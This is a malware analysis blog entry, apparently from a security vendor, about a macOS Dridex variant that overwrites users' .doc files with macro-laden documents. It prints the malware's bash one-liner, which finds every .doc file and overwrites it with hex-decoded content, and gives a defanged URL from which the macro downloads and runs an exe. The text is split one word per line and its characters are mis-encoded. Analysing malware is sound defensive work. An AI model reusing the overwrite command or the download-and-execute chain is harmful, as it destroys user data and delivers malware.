ntroduction
Normally
,
documents
containing
malicious
macros
enter
a
user
¡¦
s
system
via
email
attachments
posing
as
normal
document
files
.
However
,
while
this
might
be
the
primary
method
of
arrival
,
malicious
actors
have
other
ways
of
entering
a
victim
¡¦
s
system
.
This
blog
entry
primarily
concerns
Dridex
,
an
online
banking
malware
that
has
been
active
for
years
.
The
variant
we
analyzed
has
made
its
way
into
the
MacOS
platform
and
has
adopted
a
new
technique
to
deliver
documents
embedded
with
malicious
macros
to
users
without
having
to
pretend
to
be
invoices
or
other
business-related
files
.
Arrival
The
Dridex
sample
we
investigated
arrived
as
a
Mach-o
executable
file
:
a.out
(
which
we
detected
as
Trojan.MacOS.DRIDEX.MANP
)
.
The
first
submission
for
this
in
Virus
Total
(
VT
)
dates
to
2019
,
where
it
was
tagged
as
malicious
by
security
vendors
with
no
specific
detection
names
.

Installation
using
segments
(
a
)
__DATA__data
segment
The
data
segment
of
the
sample
contains
the
malicious
embedded
document
and
is
used
by
the
_payload_doc
variable
.
The
disassembly
in
Figure
4
shows
that
the
malware
performs
a
loop
where
the
content
of
_payload_doc
is
copied
until
the
counter
reaches
_payload_doc_len
,
the
size
of
the
malicious
code
.
This
is
in
preparation
for
the
overwriting
routine
.

(

__DATA_cstring
segment
Once
the
malicious
code
is
ready
,
the
cstring
segment
plays
a
role
in
overwriting
the
code
to
the
target
files
.
This
segment
contains
the
following
bash
script
command
:
for
i
in
$
(
find
~
-name
¡§
*
.doc
¡¨
)
;
do
echo
¡¥
%
s
¡¦
|
xxd
-r
-p
>
$
i
;
done
First
,
the
malware
searches
for
files
in
the
current
user
(
~/User/
{
user
name
}
)
directory
that
use
the
.doc
file
extension
using
the
find
~
-name
¡§
*
.doc
¡¨
command
.
It
then
traverses
through
each
document
file
(
i
)
using
for
loop
,
and
then
writes
the
malicious
code
via
the
echo
¡¥
%
s
¡¦
command
(
where
%
s
is
the
malicious
code
from
the
data
segment
)
.
Adding
xxd
-r
-p
to
the
script
means
that
the
malicious
code
will
be
written
in
plain
hexadecimal
dump
,
and
not
the
actual
content
.
The
>
$
i
part
of
the
script
implies
that
the
output
will
be
printed
on
each
document
file
.

Analysis
of
the
embedded
document
The
malicious
embedded
document
was
first
detected
in
the
wild
in
2015
with
the
following
information
:
SHA256
:

Using
oletools
,
a
python
package
used
to
analyze
OLE
and
Microsoft
files
,
we
observed
that
the
affected
.doc
files
now
contain
macros
.

Based
on
the
extracted
macros
,
the
.doc
file
contains
suspicious
components
.
To
elaborate
,
here
are
the
VBA
components
of
the
overwritten
documents
:
ThisDocument
is
an
object
that
includes
the
autoopen
macro
which
calls
the
malicious
functions
.
These
functions
use
normal-looking
names
to
pose
as
regular
functions
.
For
instance
,
CreatePicture
and
CreateColor
are
normally
used
to
create
image-related
objects
,
but
in
this
VBA
project
,
they
perform
malicious
tasks
.

Module1
Creates
an

file
in
the
temporary
(
TEMP
)
folder
and
then
runs
it
.
The
malware
uses
string
concatenation
as
a
method
for
obfuscating
the
name
of
the
executable
file
it
creates
.

Module2
contains
the
routine
that
decrypts
a
set
of
strings
,
which
is
a
URL
,
and
then
connects
to
it
to
retrieve
a
file
using
the
GET
command
.
The
malware
uses
basic
string
encryption
to
hide
the
malicious
URL
it
connects
to
.
It
calls
the
RuBik
(
)
function
to
perform
the
decryption
routine
.

The
contacted
URL
and
the
dropped
files
In
this
section
,
we
will
analyze
the
payload
dropped
by
the
malware
.
Note
that
since
it
is
an
exe
file
,
it
will
not
run
in
a
MacOS
environment
.
It
is
possible
that
the
variant
we
analyzed
is
still
in
the
testing
stages
and
has
not
yet
been
fully
converted
to
work
in
MacOS-based
machines
.
When
the
document
is
opened
and
the
macro
is
enabled
,
the
malware
connects
to
the
URL
decrypted
in
Module2
to
retrieve
a
file
(
87i4g3d2d2.exe
)
using
the
GET
command
:
hxxp
:
//pr-clanky
[
.
]
kvalitne
[

]
cz/65y3fd23d/87i4g3d2d2
[
.
]
exe
While
the
macro
feature
in
Microsoft
Word
is
disabled
by
default
,
the
malware
will
overwrite
all
the
document
files
for
the
current
user
,
including
the
clean
files
.
This
makes
it
more
difficult
for
the
user
to
determine
whether
the
file
is
malicious
since
it
doesn
¡¦
t
come
from
an
external
source
.
After
connecting
to
the
domain
,
the
content
of
the
portable
executable
(
PE
)
file
is
written
to
trume1.exe
(
aa6873a6002e152669f54c80801ca7d500ee8c00d5a6a8c223203303b1cbaf50
)
as
analyzed
in
Module1
,
2
,
and
3
.
The
file
trume1.exe
will
then
be
executed
.

Conclusion
Dridex
is
not
a
new
malware
¡X
it
has
been
observed
in
the
wild
for
years
now
.
Despite
its
age
,
it
continues
to
be
used
,
and
in
fact
has
even
seen
many
enhancements
over
the
years
.
Its
entry
point
into
the
user
¡¦
s
system
has
traditionally
been
through
email
attachments
,
but
this
blog
entry
illustrates
that
the
malicious
actors
using
Dridex
are
also
trying
to
find
new
targets
and
more
efficient
methods
of
entry
.
Currently
,
the
impact
on
MacOS
users
for
this
Dridex
variant
is
minimized
since
the
payload
is
an
exe
file
(
and
therefore
not
compatible
with
MacOS
environments
)
.
However
,
it
still
overwrites
document
files
which
are
now
the
carriers
of
Dridex
¡¦
s
malicious
macros
.
Furthermore
,
it
¡¦
s
possible
that
the
threat
actors
behind
this
variant
will
implement
further
modifications
that
will
make
it
compatible
with
MacOS
.
We
encourage
users
to
avoid
being
infected
by
attacks
that
use
social
engineering
and
malicious
documents
by
refraining
from
clicking
links
or
opening
attachments
and
embedded
documents
in
emails
.
Furthermore
,
organizations
can

technologies
